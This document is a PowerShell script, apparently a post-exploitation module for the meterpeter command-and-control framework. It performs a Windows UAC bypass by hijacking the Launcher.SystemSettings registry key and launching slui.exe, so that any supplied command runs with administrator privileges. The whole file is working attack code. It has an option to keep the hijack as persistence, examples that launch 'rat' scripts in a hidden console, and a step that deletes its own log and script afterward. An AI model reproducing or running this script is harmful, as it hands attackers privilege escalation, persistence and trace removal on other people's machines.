<#
.SYNOPSIS
   SluiEOP can be used to escalate privileges or to execute a command with high integrity (Admin)

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - 18363.778
   EOP Disclosure By: @mattharr0ey
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev Version: v1.9

.DESCRIPTION
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS cmdlet automates all of this tasks).

.NOTES
   SluiEOP cmdlet was written to be one meterpeter C2 post-exploit module.
   SluiEOP cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
   To run child binarys (.exe) through this cmdlet use: cmd /c start bin.exe

   This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
   Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
   hacks will NOT be deleted in the end of exec making the '$Command' persistence.
   [Remark: .\SluiEOP.ps1 "deleteEOP" argument can be used to delete persistence].

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
   Execute notepad process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
   Execute powershell process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat"
   Execute $Env:TMP\rat.bat script with high privileges (Admin)

.EXAMPLE
   PS C:\> .\SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\rat.ps1"
   Execute $Env:TMP\rat.ps1 script with high privileges (Admin) in an hidden console.

.INPUTS
   None. You cannot pipe objects into SluiEOP.ps1

.OUTPUTS
   Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
    https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
#>


$Command = $Null               # Command Internal function [<dontchange>]
$DebugMode = "False"           # Change this value to "True" to debug cmdlet
$EOP_Success = $False          # Remote execution Status [<dontchange>]
$MakeItPersistence = "False"   # Change this value to "True" to persiste $Command
$param1 = $args[0]             # User Inputs [ <arguments> ] [<dontchange>]
If(-not($param1) -or $param1 -eq $null){
   $Command = "$Env:WINDIR\System32\cmd.exe"
   Write-Host "[ ERROR ] SYNTAX: .\SluiEOP.ps1 `"Command to execute`"`n" -ForegroundColor Red -BackgroundColor Black
   Start-Sleep -Milliseconds 1200
}Else{
   $Command = "$param1"
}

## Check for regedit vulnerable HIVE existence before continue any further ..
$CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
If($CheckVuln -eq $True){

   ## SluiEOP post-module banner
   Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
   Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 500

   ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
   #  This function 'reverts' all regedit hacks to the previous state before the EOP.
   If($param1 -eq "deleteEOP"){
      Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 500
      ## Make sure the vulnerable registry key exists
      $CheckHive = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -ErrorAction SilentlyContinue
      If($CheckHive -eq $True){
         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
         Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted."
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
      }Else{
         Write-Host "[ ] Failed    => None SluiEOP registry keys found under:"
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
      }
      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
      Exit
   }

   ### Add Entrys to Regedit { using powershell }
   Write-Host "[+] Hijacking => Slui.exe execution in registry."
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 650

   ## The Next Registry entry allow us to execute our command under high privileges (Admin)
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   # ---
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 650
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Milliseconds 650
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Milliseconds 700
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 650

   ## Start the vulnerable Process { using powershell }
   Write-Host "[+] Hijacking => Slui.exe process execution."
   Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas

   Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
   ## If $MakeItPersistence is set to "True" then the EOP registry hacks will NOT
   # be deleted in the end of cmdlet execution, making the 'command' persistence.
   If($MakeItPersistence -eq "False"){
      ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
      Write-Host "[+] Deleting  => EOP registry hacks (revert)"
      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
      Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
   }Else{
      Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 500
      Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow
   }

   <#
   .SYNOPSIS
      Helper - Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>
      Author: @r00t-3xp10it

   .DESCRIPTION
      Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>
      If active '$DebugMode' then more detailed information will be displayed.

   .EXAMPLE
      PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"

      UserDomain ProccessName Status   PID
      ---------- ------------ ------   ---
      SKYNET     notepad      success  5543
   #>

   ## Extracting attacker Spawned ProcessName PID
   Write-Host "[+] Executing => EOP output Table displays.`n";Start-Sleep -Milliseconds 500
   If($Command -match '^[cmd]' -and $Command -match ' ' -and $Command -NotMatch '.bat$' -and $Command -NotMatch '.ps1$' -and $Command -NotMatch '.py$'){
      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
      $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
      If($ProcessName -match '[.exe]$'){
         $ReturnCode = "0";$ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True}
      }Else{
         $EOPID = "null"
      }
   }
   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
      ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      If($ProcessName -match '[.exe]$'){
         $ReturnCode = "1";$ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True}
      }Else{
         $EOPID = "null"
      }
   }
   ## [CMD|POWERSHELL|PYTHON] (scripts) - interpreters supported
   ElseIf($Command -match '^[powershell]' -or $Command -match '^[cmd]' -or $Command -match '^[python]' -and $Command -match ' ' -and $Command -match '.ps1$' -or $Command -match '.bat$' -or $Command -match '.py$'){
      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
      ## Extract powershell.exe interpreter process PID
      If($Command -match '^[powershell].*[.ps1]$'){
         $ReturnCode = "2.0";$EOPID = Get-Process powershell -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True}
      }
      ## Extract cmd.exe interpreter process PID
      ElseIf($Command -match '^[cmd].*[.bat]$'){
         $ReturnCode = "2.1";$EOPID = Get-Process cmd -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
      }
      ## Extract python.exe interpreter process PID
      ElseIf($Command -match '^[python].*[.py]$'){
         $ReturnCode = "2.2";$EOPID = Get-Process python -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
      }
      Else{
         $EOPID = "null"
      }
   }
   Else{
      ## String: "powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      If($ProcessName -match '[.exe]$'){
         $ReturnCode = "3";$ProcessName = $ProcessName -replace '.exe',''
         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
         If($EOPID -match '^\d+$'){$EOP_Success = $True}
      }Else{
         $EOPID = "null"
      }
   }

   ## Build MY PSObject Table to display results
   $MYPSObjectTable = New-Object -TypeName PSObject
   If($DebugMode -eq "True"){
      $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path
      $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Id" -Value "$ReturnCode"
    }
    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error ?";$EOPID = "null"}
    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Status" -Value "$EOPState"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "StartTime" -Value "$SpawnTime"}
    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
    echo $MYPSObjectTable > $Env:TMP\sLUIEop.log

}Else{
   ## Vulnerable registry hive => not found
   Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
   Write-Host "[ ERROR ] System Doesn't Seems Vulnerable, Aborting ..`n" -ForegroundColor red -BackgroundColor Black
}

## Clean old files left behind after EOP finished ..
If(Test-Path "$Env:TMP\sLUIEop.log"){Get-Content -Path "$Env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
Exit
